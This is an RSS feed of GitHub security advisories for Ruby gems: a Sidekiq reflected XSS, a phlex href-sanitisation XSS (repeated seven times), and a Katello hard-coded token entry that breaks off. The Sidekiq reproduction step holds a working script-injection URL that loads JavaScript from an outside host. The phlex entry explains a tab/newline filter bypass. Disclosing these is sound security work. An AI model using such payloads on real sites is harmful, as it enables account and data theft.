<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
    <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
    <updated>2024-04-27T15:01:21.328Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
    <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[sidekiq] Sidekiq vulnerable to a Reflected XSS in Queues Web Page]]></title>
        <id>https://github.com/advisories/GHSA-q655-3pj8-9fxq</id>
        <link href="https://github.com/advisories/GHSA-q655-3pj8-9fxq"/>
        <updated>2024-04-26T22:19:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description:</h3>
<p>During the source Code Review of the metrics.erb view of the Sidekiq Web UI, A reflected XSS vulnerability is discovered. The value of substr parameter is reflected in the response without any encoding, allowing an attacker to inject Javascript code into the response of the application. </p>
<p>This vulnerability can be exploited to target the users of the application, and users of other applications deployed on the same domain or website as that of the Sidekiq website. Successful exploit results may result in compromise of user accounts and user data.</p>
<h3 id="impact">Impact:</h3>
<p>The impact of this vulnerability can be severe. An attacker could exploit it to target users of the Sidekiq Web UI. Moreover, if other applications are deployed on the same domain or website as Sidekiq, users of those applications could also be affected, leading to a broader scope of compromise. Potentially compromising their accounts, forcing the users to perform sensitive actions, stealing sensitive data, performing CORS attacks, defacement of the web application, etc.</p>
<h3 id="mitigation">Mitigation:</h3>
<p>Encode all output data before rendering it in the response to prevent XSS attacks.</p>
<h3 id="steps-to-reproduce">Steps to Reproduce:</h3>
<ol>
<li>Go to the following URL of the sidekiq Web UI: 
https://{host}/sidekiq/metrics?substr=beret%22%3E%3Cscript%20src=%22<a href="https://cheemahq.vercel.app/a.js%22%20/%3E">https://cheemahq.vercel.app/a.js%22%20/%3E</a></li>
<li>XSS payload will be executed, causing a popup.</li>
</ol>
<h3 id="evidence">Evidence:</h3>
<p><img alt="image" src="https://github.com/sidekiq/sidekiq/assets/59286712/9b7efa06-60bc-4d72-bb37-c5949154827e">
Figure 1: Source Code Vulnerable to XSS</p>
<p><img alt="image" src="https://github.com/sidekiq/sidekiq/assets/59286712/7a801feb-d495-416e-8e0e-36dee0eadf85">
Figure 2: XSS payload triggered</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sidekiq/sidekiq/security/advisories/GHSA-q655-3pj8-9fxq">https://github.com/sidekiq/sidekiq/security/advisories/GHSA-q655-3pj8-9fxq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32887">https://nvd.nist.gov/vuln/detail/CVE-2024-32887</a></li>
<li><a href="https://github.com/sidekiq/sidekiq/commit/30786e082c70349ab27ffa9eccc42fb0c696164d">https://github.com/sidekiq/sidekiq/commit/30786e082c70349ab27ffa9eccc42fb0c696164d</a></li>
<li><a href="https://github.com/sidekiq/sidekiq/releases/tag/v7.2.4">https://github.com/sidekiq/sidekiq/releases/tag/v7.2.4</a></li>
<li><a href="https://github.com/advisories/GHSA-q655-3pj8-9fxq">https://github.com/advisories/GHSA-q655-3pj8-9fxq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q655-3pj8-9fxq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-26T22:19:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[katello] Katello uses hard coded credential]]></title>
        <id>https://github.com/advisories/GHSA-5xv2-q475-rwrh</id>
        <link href="https://github.com/advisories/GHSA-5xv2-q475-rwrh"/>
        <updated>2024-04-12T18:08:37.000Z</updated>
        <content type="html"><![CDATA[<p>The installation script in Katello 1.0 and earlier does not properly generate the <code>Application.config.secret_token</code> value, which causes each default installation to have the same secret token, and allows remote attackers to authenticate to the CloudForms System Engine web interface as an arbitrary user by creating a cookie using the default <code>secret_token</code>.</p>
<h3 id="references">References</h3>
<ul>
